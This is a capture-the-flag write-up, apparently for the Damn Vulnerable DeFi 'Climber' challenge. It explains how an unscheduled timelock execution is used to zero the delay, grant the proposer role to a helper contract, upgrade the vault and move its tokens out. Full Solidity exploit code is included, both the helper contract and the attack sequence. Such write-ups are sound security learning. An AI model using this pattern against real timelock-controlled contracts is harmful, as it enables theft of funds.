# Solving "Climber" - My Journey 🕵️‍♂️

## Overview

The **Climber** challenge presented a fascinating recursive dependency problem that required creative problem-solving. While the challenge appeared simple on the surface, it proved to be quite witty and required basic common sense.

## Steps Taken to Solve the Issue

Before diving into the recursive dependency solution, let me outline the complete exploit chain I figured:

1. The `ClimberVault` contract held all the tokens and was upgradeable, giving me the opportunity to deploy a new implementation with exploit-friendly functionality.
2. But the owner of `ClimberVault` was `ClimberTimelock`, meaning only `ClimberTimelock` could trigger the upgrade call.
3. This meant `upgradeToAndCall` needed to be triggered by `ClimberTimelock` itself.
4. Then I analysed the `ClimberTimelock` functions
   - `schedule` - Only callable by `PROPOSER_ROLE`
   - `execute` - Open for everyone to call
5. But `execute` came along with a caveat which is to successfully call `execute` for an operation, that operation needed to be `scheduled` first.
6. Another thing to note, to make the operation ready for execution immediately the `delay` value needed to be modified.
7. Hence to bypass the delay, the `updateDelay` function in `ClimberTimelock` needed to be called to change the delay from `1 hour to 0`, allowing all calls to be made in a single transaction.
8. This created a chain of required calls:
   - Call to `updateDelay`
   - Call to update the assignment of `PROPOSER_ROLE`
   - Call to upgrade the `ClimberVault` contract
   - Call to `schedule`
   - Call to `execute`

## The Dependency loop

The problem occured as follows:

1. Within the `execute` call, the final call needed to be a schedule call.
2. The `schedule` function needed to schedule itself as well for IDs to align.
3. This created a **circular dependency** where each function relied on the other.

## Initial Misunderstanding

My first instinct was to do something with the `salt` parameter, thinking it might provide a solution to the recursive dependency. However, after extensive testing, I found out that salt didn't play any substantial role in resolving the core issue.

## The Real Challenge

The fundamental problem was ensuring that both `schedule` and `execute` would modify states for the same operation ID. This became particularly tricky because:

- The last call to `schedule` within `execute` became problematic.
- `schedule` was trying to get an operation ID for 3 major operations (`Delay update`, `Propser update`, `Upgrade update`)
- `execute` was computing the operation ID based on 3 major calls plus the additional call to `schedule`.

This mismatch in operation ID calculation was the root cause of the issue.

## The Solution

To solve this problem, I created a separate helper contract with two main functions:

```javascript
contract HelperContract {
    address[] private s_targets;
    bytes[] private s_dataElements;
    ClimberTimelock immutable i_timelock ;

    constructor(ClimberTimelock timelock){
        i_timelock = timelock;
    }

    function setSchedule(address[] memory _targets, bytes[] memory _dataElements)external {
        s_targets = _targets;
        s_dataElements = _dataElements;
    }
    function callSchedule() external {
        uint256[] memory _values = new uint256[](s_targets.length);
        i_timelock.schedule(s_targets, _values, s_dataElements, 0);
    }
}
```

### Helper Contract Functions

1. **`setSchedule` Function**
   This function sets up the `targets` and `dataElements`, including the call to itself:
   ```javascript
   function setSchedule(address[] memory _targets, bytes[] memory _dataElements) external {
    s_targets = _targets;
    s_dataElements = _dataElements;
   }
   ```
2. **`callSchedule` Function**
   This function handles the actual scheduling:
   ```javascript
   function callSchedule() external {
    uint256[] memory _values = new uint256[](s_targets.length);
    i_timelock.schedule(s_targets, _values, s_dataElements, 0);
   }
   ```

## The Exploit code

```javascript
    ClimberVaultV2 vaultV2 = new ClimberVaultV2();
    HelperContract helper = new HelperContract(timelock);

    bytes memory data =
        abi.encodeCall(ClimberVaultV2.moveFunds, (address(token), VAULT_TOKEN_BALANCE, recovery));

    address[] memory scheduleTargets = new address[](4);
    uint256[] memory scheduleValues = new uint256[](4);
    bytes[] memory scheduleDataElements = new bytes[](4);

    scheduleTargets[0] = address(timelock);
    scheduleValues[0] = 0;
    scheduleDataElements[0] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

    scheduleTargets[1] = address(timelock);
    scheduleValues[1] = 0;
    scheduleDataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(helper)));

    scheduleTargets[2] = address(vault);
    scheduleValues[2] = 0;
    scheduleDataElements[2] = abi.encodeCall(UUPSUpgradeable.upgradeToAndCall, (address(vaultV2), data));

    scheduleTargets[3] = address(helper);
    scheduleValues[3] = 0;
    scheduleDataElements[3] = abi.encodeCall(HelperContract.callSchedule, ());

    helper.setSchedule(scheduleTargets, scheduleDataElements);

    timelock.execute(scheduleTargets, scheduleValues, scheduleDataElements, 0);

```

## Conclusion

This solution required thinking outside the box and implementing a helper contract pattern to break the circular dependency.

The key takeaway is that sometimes the most elegant solutions come from stepping back and restructuring the problem rather than trying to force a direct solution within the existing constraints.
